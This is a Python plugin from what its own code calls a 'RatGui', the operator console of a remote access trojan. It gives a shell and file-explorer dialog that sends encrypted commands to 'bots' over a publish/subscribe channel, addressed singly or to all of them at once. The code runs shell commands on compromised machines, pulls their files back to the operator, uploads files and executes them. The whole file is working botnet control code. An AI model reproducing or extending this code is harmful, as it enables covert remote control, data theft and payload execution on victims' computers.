# plugins/shell_access.py
from PyQt6.QtWidgets import (QDialog, QTreeWidget, QTreeWidgetItem, QMenu, QVBoxLayout, 
                             QHBoxLayout, QLineEdit, QPushButton, QFormLayout, QFileDialog)
from PyQt6.QtCore import Qt, QTimer
from .base_plugin import BasePlugin
import ujson as json
import os
import base64
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class ShellAccessDialog(QDialog):
    def __init__(self, gui, target="all", current_dir="", client=None, topic="/commands/"):
        super().__init__(gui)
        logger.info("Initializing ShellAccessDialog")
        self.gui = gui  # Store the RatGui instance directly
        self.client = client
        self.topic = topic
        self.target = target
        self.current_dir = current_dir if current_dir else ("all" if target == "all" else "C:/")
        self.last_action = ""  # Track the last action for cd detection
        print(f"ShellAccessDialog initialized with target={target}, current_dir={self.current_dir}")
        self.setWindowTitle('File Explorer')
        self.setMinimumSize(600, 400)
        self.setStyleSheet("""
            QDialog { background-color: #1a1a1a; color: #00ff00; }
            QLineEdit { 
                background-color: #2a2a2a; 
                color: #00ff00; 
                border: 2px solid #00ff00; 
                font-family: 'Courier New'; 
                font-size: 12px; 
            }
            QPushButton { 
                background-color: #333333; 
                color: #00ff00; 
                padding: 8px; 
                border: 2px solid #00ff00; 
                font-family: 'Courier New'; 
                font-size: 12px; 
            }
            QPushButton:hover { background-color: #444444; }
            QTreeWidget {
                background-color: #2a2a2a;
                color: #00ff00;
                border: 2px solid #00ff00;
                font-family: 'Courier New';
                font-size: 12px;
            }
        """)
        layout = QVBoxLayout()

        # Tree widget for file explorer
        self.tree_widget = QTreeWidget()
        self.tree_widget.setHeaderHidden(True)
        self.tree_widget.setMinimumHeight(300)
        self.tree_widget.itemDoubleClicked.connect(self.navigate_item)
        self.tree_widget.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.tree_widget.customContextMenuRequested.connect(self.show_item_context_menu)
        layout.addWidget(self.tree_widget)

        # Command input and execute button
        form_layout = QFormLayout()
        self.command_input = QLineEdit()
        self.command_input.setText(f"{self.current_dir}: > ")
        self.command_input.setCursorPosition(len(self.command_input.text()))
        form_layout.addRow('Command:', self.command_input)
        layout.addLayout(form_layout)

        # Buttons
        button_layout = QHBoxLayout()
        execute_button = QPushButton('Execute')
        execute_button.clicked.connect(self.execute_command)
        button_layout.addWidget(execute_button)
        close_button = QPushButton('Close')
        close_button.clicked.connect(self.accept)
        button_layout.addWidget(close_button)
        layout.addLayout(button_layout)

        self.setLayout(layout)

        # Create downloads directory if it doesn't exist
        self.downloads_dir = os.path.join(os.getcwd(), "downloads")
        if not os.path.exists(self.downloads_dir):
            os.makedirs(self.downloads_dir)

        # Load initial directory contents
        if target != "all":
            self.execute_command("dir")

    def execute_command(self, command=None):
        """Send a shell command to the bot."""
        command_text = command if command else self.command_input.text()
        if not command and command_text.startswith(f"{self.current_dir}: > "):
            command_text = command_text[len(f"{self.current_dir}: > "):].strip()
        else:
            command_text = command_text.strip()
        if command_text:
            # Track the last action for cd detection
            self.last_action = command_text if command else "manual_command"
            cmd = {'type': 'command', 'target': self.target, 'action': 'shell', 'command': command_text}
            cmd_json = json.dumps(cmd)
            encrypted_cmd = self.gui.encrypt_message(cmd_json)  # Use self.gui instead of self.parent
            self.client.publish(self.topic, encrypted_cmd)
            print(f"ShellAccessDialog sent command: {cmd}")
        if not command:  # If called from execute button, clear input
            self.command_input.setText(f"{self.current_dir}: > ")
            self.command_input.setCursorPosition(len(self.command_input.text()))

    def update_response(self, response):
        """Update the file explorer with the response from the bot."""
        print(f"ShellAccessDialog updating response: {response}")
        self.current_dir = response.get('current_dir', self.current_dir)
        self.current_dir = self.current_dir.replace('\\', '/')
        result = response.get('result', '')

        # If the last action was a cd command from navigation, auto-run dir
        if self.last_action.startswith("cd ") and self.last_action != "manual_command":
            self.last_action = ""  # Reset last action
            self.execute_command("dir")
            return

        # Clear existing items
        self.tree_widget.clear()

        # Add "Go Back" option if not at root
        if self.current_dir != "C:/":
            go_back_item = QTreeWidgetItem(self.tree_widget, ["[..]"])
            go_back_item.setData(0, Qt.ItemDataRole.UserRole, "go_back")

        # Parse result as a list of items (assuming dir/ls output)
        items = result.split('\n')
        for item in items:
            item = item.strip()
            if item:
                tree_item = QTreeWidgetItem(self.tree_widget, [item])
                # Determine if it's a folder (simplified: folders usually don't have extensions)
                if '.' not in item:
                    tree_item.setData(0, Qt.ItemDataRole.UserRole, "folder")
                else:
                    tree_item.setData(0, Qt.ItemDataRole.UserRole, "file")
        self.command_input.setText(f"{self.current_dir}: > ")
        self.command_input.setCursorPosition(len(self.command_input.text()))

    def navigate_item(self, item, column):
        """Navigate into a folder or go back by double-clicking."""
        item_type = item.data(0, Qt.ItemDataRole.UserRole)
        if item_type == "go_back":
            # Go up one directory
            parent_dir = os.path.dirname(self.current_dir).replace('\\', '/')
            self.execute_command(f"cd {parent_dir}")
        elif item_type == "folder":
            # Navigate into folder
            folder_name = item.text(0)
            new_path = os.path.join(self.current_dir, folder_name).replace('\\', '/')
            self.execute_command(f"cd {new_path}")

    def show_item_context_menu(self, pos):
        """Show right-click context menu for items."""
        item = self.tree_widget.itemAt(pos)
        if item:
            item_type = item.data(0, Qt.ItemDataRole.UserRole)
            menu = QMenu()
            if item_type == "file":
                download_action = menu.addAction("Download")
                download_action.triggered.connect(lambda: self.download_file(item.text(0)))
                upload_action = menu.addAction("Upload")
                upload_action.triggered.connect(lambda: self.upload_file())
                execute_action = menu.addAction("Execute")
                execute_action.triggered.connect(lambda: self.execute_file(item.text(0)))
            menu.exec(self.tree_widget.mapToGlobal(pos))

    def download_file(self, file_name):
        """Send a download command to the bot."""
        cmd = {
            'type': 'command',
            'target': self.target,
            'action': 'download',
            'file': file_name
        }
        cmd_json = json.dumps(cmd)
        encrypted_cmd = self.gui.encrypt_message(cmd_json)  # Use self.gui
        self.client.publish(self.topic, encrypted_cmd)
        print(f"ShellAccessDialog sent download command for file: {file_name}")

    def upload_file(self):
        """Open a file dialog to select a file and upload it to the bot."""
        file_path, _ = QFileDialog.getOpenFileName(self, "Select File to Upload", "", "All Files (*)")
        if file_path:
            try:
                with open(file_path, 'rb') as f:
                    file_data = f.read()
                encoded_data = base64.b64encode(file_data).decode('utf-8')
                file_name = os.path.basename(file_path)
                cmd = {
                    'type': 'command',
                    'target': self.target,
                    'action': 'upload',
                    'file': file_name,
                    'data': encoded_data
                }
                cmd_json = json.dumps(cmd)
                encrypted_cmd = self.gui.encrypt_message(cmd_json)  # Use self.gui
                self.client.publish(self.topic, encrypted_cmd)
                print(f"ShellAccessDialog sent upload command for file: {file_name}")
            except Exception as e:
                print(f"Error uploading file: {e}")

    def execute_file(self, file_name):
        """Send an execute command to the bot."""
        cmd = {
            'type': 'command',
            'target': self.target,
            'action': 'execute',
            'file': file_name
        }
        cmd_json = json.dumps(cmd)
        encrypted_cmd = self.gui.encrypt_message(cmd_json)  # Use self.gui
        self.client.publish(self.topic, encrypted_cmd)
        print(f"ShellAccessDialog sent execute command for file: {file_name}")

    def handle_download_response(self, data):
        """Handle the download response from the bot and save the file."""
        file_name = data.get('message', 'downloaded_file')
        file_data = data.get('file_data', '')
        try:
            decoded_data = base64.b64decode(file_data)
            file_path = os.path.join(self.downloads_dir, file_name)
            with open(file_path, 'wb') as f:
                f.write(decoded_data)
            print(f"ShellAccessDialog saved downloaded file to: {file_path}")
        except Exception as e:
            print(f"Error saving downloaded file: {e}")

    def handle_upload_response(self, data):
        """Handle the upload response from the bot."""
        message = data.get('message', 'Upload response received')
        print(f"ShellAccessDialog upload response: {message}")
        # Refresh the directory to show the new file
        self.execute_command("dir")

    def handle_execute_response(self, data):
        """Handle the execute response from the bot."""
        message = data.get('message', 'Execute response received')
        print(f"ShellAccessDialog execute response: {message}")

class ShellAccessPlugin(BasePlugin):
    def __init__(self, parent):
        super().__init__(parent)
        logger.info("Initializing ShellAccessPlugin")
        self.name = "Shell Access"
        self.menu_action = self.name
        self.category = "Interaction"
        self.priority = 40
        self.dialogs = {}
        self.current_dirs = {}
        logger.info(f"ShellAccessPlugin initialized with name: {self.name}, menu_action: {self.menu_action}")

    def execute(self, target):
        logger.info(f"Executing ShellAccessPlugin for target: {target}")
        current_dir = self.current_dirs.get(target, "")
        dialog = ShellAccessDialog(self.parent, target, current_dir, client=self.parent.client, topic=self.parent.topic)
        self.dialogs[target] = dialog
        dialog.exec()
        del self.dialogs[target]

    def get_menu_action(self):
        logger.info(f"ShellAccessPlugin get_menu_action returning: {self.menu_action}")
        return self.menu_action

    def handle_response(self, data):
        if data.get('type') == 'shell_response':
            ip = data['ip']
            bot_id = data['id']
            target = f"{ip}:{bot_id}" if 'target' not in locals() else 'all'
            dialog = self.dialogs.get(target)
            print(f"ShellAccessPlugin handle_response: target={target}, dialog found={dialog is not None}")
            if dialog:
                self.current_dirs[target] = data.get('current_dir', dialog.current_dir)
                dialog.update_response(data)
        elif data.get('type') == 'download_response':
            ip = data['ip']
            bot_id = data['id']
            target = f"{ip}:{bot_id}"
            dialog = self.dialogs.get(target)
            if dialog:
                dialog.handle_download_response(data)
        elif data.get('type') == 'upload_response':
            ip = data['ip']
            bot_id = data['id']
            target = f"{ip}:{bot_id}"
            dialog = self.dialogs.get(target)
            if dialog:
                dialog.handle_upload_response(data)
        elif data.get('type') == 'execute_response':
            ip = data['ip']
            bot_id = data['id']
            target = f"{ip}:{bot_id}"
            dialog = self.dialogs.get(target)
            if dialog:
                dialog.handle_execute_response(data)